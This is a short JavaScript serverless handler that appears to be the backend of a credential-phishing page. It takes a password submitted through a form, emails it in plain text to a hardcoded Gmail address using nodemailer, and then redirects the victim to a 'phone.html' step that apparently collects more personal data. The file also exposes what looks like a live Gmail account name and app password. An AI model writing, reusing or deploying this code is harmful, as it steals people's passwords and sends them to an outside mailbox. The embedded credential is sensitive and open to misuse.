const nodemailer = require('nodemailer');
const querystring = require('querystring');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const params = querystring.parse(event.body);
  const { password } = params;

  // Send email to admin
  await sendEmail('User entered password: ' + password);

  return {
    statusCode: 302,
    headers: {
      Location: '/phone.html',
    },
    body: '',
  };
};

async function sendEmail(message) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bhanukiran750@gmail.com',
      pass: 'okkx rhic nhxi vbvi'
    }
  });

  const mailOptions = {
    from: 'bhanukiran750@gmail.com',
    to: 'bhanukiran750@gmail.com', // Replace with admin email
    subject: 'User Data Submission',
    text: message
  };

  try {
    await transporter.sendMail(mailOptions);
  } catch (error) {
    console.error(error);
  }
}